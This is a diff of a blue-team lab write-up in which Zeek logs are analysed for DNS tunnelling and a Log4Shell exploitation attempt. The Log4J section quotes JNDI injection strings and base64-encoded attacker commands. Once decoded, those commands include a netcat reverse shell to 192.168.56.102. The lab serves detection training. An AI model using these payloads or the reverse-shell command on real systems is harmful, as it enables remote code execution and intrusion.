@@ -32,24 +32,25 @@ Ans: ***9.420791***
 
 ### Q3. Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?
 
-- `cat dns.log | zeek-cut qtype_name | sort | uniq`
-- ![image](https://github.com/user-attachments/assets/4ef32209-8c78-4c07-bee7-ed94533b81cb)
+- `cat dns.log | zeek-cut query | sort | uniq`
+- ![image](https://github.com/user-attachments/assets/7488a06a-61df-4e2b-a7ca-b4c277879f54)
+- in this case, lets use `rev` and `cut` to reverse the output and use cut to term the domain to only print their second-level and top-level domains
+- `cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq` 
+- ![image](https://github.com/user-attachments/assets/b11265f6-6bc4-4e46-8869-ba775f5adc58)
 
 Ans: ***6***
 
 ### Q4. There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?
 
-- `cat conn.log | zeek-cut id.orig_h id.resp_h service | grep "dns" `
-- ![image](https://github.com/user-attachments/assets/fdb5df36-14a9-48ae-84c5-ae0399763621)
-- `cat conn.log | zeek-cut id.orig_h id.resp_h service | awk  '/10.20.57.3/ && /10.10.2.21/' | grep "dns" | wc   `
-- ![image](https://github.com/user-attachments/assets/2c09d968-e6c4-4773-ae58-06bb9cb0f1db)
-- There are 2851 DNS connections between the two IPs, so it 
+- `cat conn.log | zeek-cut id.orig_h id.resp_h service | sort | uniq -c`
+- ![image](https://github.com/user-attachments/assets/e4d1cb91-5a7a-4b0c-9167-797df2fd7f78)
+- `4238` connections to a single DNS server is unusually high.
+- Therefore, `10.20.57.3` is the source of the abnormal DNS traffic
 
 Ans: ***10.20.57.3***
 
 ## is it True Positive?
 Yes — based on the evidence, this strongly appears to be a true positive.
-pic
 
 **Why This Is Likely a True Positive?**
 
@@ -62,7 +63,7 @@ pic
    - Dozens of queries per second are not normal DNS client behavior.
    - Regular clients would typically query only once per domain and cache the result.
 4. Internal-to-Internal DNS Traffic
-The DNS server (10.10.2.21) is inside the network, which is suspicious if it's being used to resolve external-looking fake domains.
+The DNS server (`10.10.2.21`) is inside the network, which is suspicious if it's being used to resolve external-looking fake domains.
 
 
 
@@ -139,3 +140,67 @@ Yes it is a true positive. why?
 4. As a result of investigating both the malicious document and the malicious `.exe` files using **VirusTotal**, we confirmed that these files are indeed malicious.
    
 
+---
+# TASK-4: Log4J
+
+An alert triggered: "Log4J Exploitation Attempt".
+
+The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 
+
+## Answer the questions below
+
+### Q1. Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?
+
+- detection-log4j.zeek script
+- ![image](https://github.com/user-attachments/assets/af9cd207-9414-48b5-9bfb-6dad92f1855a)
+- `zeek -Cr log4shell.pcapng detection-log4j.zeek`
+- ![image](https://github.com/user-attachments/assets/2415344e-bc31-40e5-bfec-1f43c70fd930)
+- `cat signatures.log | zeek-cut note sig_id | wc -l`
+- ![image](https://github.com/user-attachments/assets/99d1d124-6c0a-4441-92f8-cf4af63acbe9)
+- the signture id `log4j_javaclassname_tcp` -> is related to **Log4Shell**, a critical vulnerability in the Apache Log4j library (**CVE-2021-44228**).
+- `Signatures::Sensitive_Signature` —> this is Zeek's internal label for potentially dangerous signatures.
+
+Ans: ***3***
+
+### Q2. Investigate the http.log file. Which tool is used for scanning?
+
+- `cat http.log | zeek-cut user_agent | sort | uniq `
+- ![image](https://github.com/user-attachments/assets/f3b24cb0-b317-43d1-885d-bc699a462e79)
+-`${jndi:ldap://127.0.0.1:1389}` -> these are malicious payload attempting to exploit the *Log4shell* vulnerability by injecting `${jndi:ldap://...}` into `User-Agent` field, hoping a vulnerable server logs them and triggers a remote JNDI lookup which can result in **remote code execution**
+- `127.0.0.1:1389` -> Likely testing locally for vulnerability.
+- `192.168.56.102:389` -> The attacker controls this host and is attempting to force a vulnerable system to connect back and load a malicious Java class.
+- `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)` -> An Nmap script scan, likely probing web services.
+Ans: ***nmap***
+
+### Q3. Investigate the http.log file. What is the extension of the exploit file?
+
+- `cat http.log | zeek-cut uri | sort | uniq `
+- ![image](https://github.com/user-attachments/assets/42ebf332-42f2-46ee-bfdf-f848340dfff4)
+- Attacker injects `${jndi:ldap://attacker-ip}` into a request (you've seen this in `user_agent`).
+- A vulnerable system logs this input.
+- The system then contacts the attacker’s LDAP server (`192.168.56.102`).
+- The LDAP server responds with a reference to a `.class` file, e.g., `ExploitXXXX.class`.
+- The system downloads and executes it — **Remote Code Execution**.
+
+Ans: ***.class***
+
+### Q4. Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?
+
+- `cat log4j.log | zeek-cut  value | grep "Command"` to grep the injected command 
+- decode the returned base64-encoded payloads embedded in **log4shell** attack
+- `for b in dG91Y2ggL3RtcC9wd25lZAo= d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg== bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==; do echo "$b" | base64 -d; echo; done` 
+- ![image](https://github.com/user-attachments/assets/87f057f9-3f1a-4d5d-8e03-5a6ca0386fc4)
+- Creates a file named `pwned` in `/tmp`
+- Checks if `nc` (Netcat) is installed and saves the output to `/tmp/pwned`
+- Tries to start a reverse shell to the attacker's machine (`192.168.56.102`) on port `80`, executing `/bin/sh`. `-vvv`is for verbose output.
+
+
+Ans: ***pwned***
+
+## Is it a True Positive?
+
+Yes- This is a clear simulated **Log4Shell exploitation** attempt where:
+1. The attacker uses [JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java/) injection in HTTP headers.
+2. The vulnerable server reaches out to an LDAP server at `192.168.56.102`.
+3. The LDAP server serves Java class exploits.
+4. The server then executes base64-encoded commands, including a reverse shell attempt.
